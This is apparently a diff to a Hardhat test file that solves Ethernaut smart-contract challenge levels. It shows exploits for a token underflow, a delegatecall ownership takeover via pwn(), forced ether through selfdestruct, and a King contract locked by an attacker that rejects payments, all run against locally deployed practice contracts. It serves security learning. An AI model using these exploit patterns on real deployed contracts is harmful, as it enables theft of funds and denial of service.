@@ -73,7 +73,7 @@ describe("Ethernaut ", function () {
     console.log("aciertos: ",(await contract.consecutiveWins()).toString())
   });
 
-  it("4.Telephone", async function () {
+  it.skip("4.Telephone", async function () {
     const Contract = await ethers.getContractFactory("Telephone");
     const contract = await Contract.deploy();
     await contract.deployed();
@@ -87,5 +87,76 @@ describe("Ethernaut ", function () {
     console.log("Owner before the attack: ", await contract.owner());
     await attacker.attack();
     console.log("Owner after the attack: ", await contract.owner());
+  });
+
+  it.skip("5.Token", async function () {
+    const Contract = await ethers.getContractFactory("Token");
+    const contract = await Contract.deploy(20);
+    await contract.deployed();
+
+    //check the correct deploy
+    expect(await contract.balanceOf(account1.address)).to.be.equal(20);
+
+    //execute the attack, balance should be greater than 20
+    await contract.transfer(account2.address, 21);
+
+    //check if the attack works
+    console.log("Balance of account1: ", (await contract.balanceOf(account1.address)).toString());
+  });
+
+  //had some wierd problems using ethers js here
+  it.skip("6.Delegation", async function () {
+    const Delegate = await ethers.getContractFactory("Delegate");
+    const delegate = await Delegate.deploy(account2.address);
+    await delegate.deployed();
+
+    const Delegation = await ethers.getContractFactory("Delegation");
+    const delegation = await Delegation.connect(account2).deploy(delegate.address);
+    await delegation.deployed();
+
+    expect(await delegation.owner()).to.be.equal(account2.address);
+    const selector = web3.eth.abi.encodeFunctionSignature("pwn()");
+    await web3.eth.sendTransaction({from: account1.address, to: delegation.address, data: selector});
+
+    expect(await delegation.owner()).to.be.equal(account1.address);
+    
+  });
+
+  it.skip("7.Force", async function () {
+    const Force = await ethers.getContractFactory("Force");
+    const force = await Force.deploy();
+    await force.deployed();
+
+    //contract with ether and selfdestruct instruction
+    const Helper = await ethers.getContractFactory("Helper");
+    const helper = await Helper.deploy(force.address,{value:'10000000000'});
+    await helper.deployed();
+
+    const provider = waffle.provider;
+
+    //call the function to destruct and send the ether
+    await helper.destroy();
+
+    console.log("Balance of Force contract: ", (await provider.getBalance(force.address)).toString());
+  });
+
+  it("9.King", async function () {
+    const King = await ethers.getContractFactory("King");
+    const king = await King.deploy({value:'100'});
+    await king.deployed();
+
+    //contract that will send ether to the king contract and cannot receive ether
+    const KingAttacker = await ethers.getContractFactory("KingAttacker");
+    const kingAttacker = await KingAttacker.connect(account2).deploy();
+    await kingAttacker.deployed();
+
+    //send ether to claim the king
+    await kingAttacker.attack(king.address,{value:'1000'});
+
+    //check that king change
+    expect(await king._king()).to.be.equal(kingAttacker.address);
+
+    //contract cannot receive ether
+     await expect(account1.sendTransaction({to:king.address, value: '10000000'})).to.be.reverted;
   });
 });
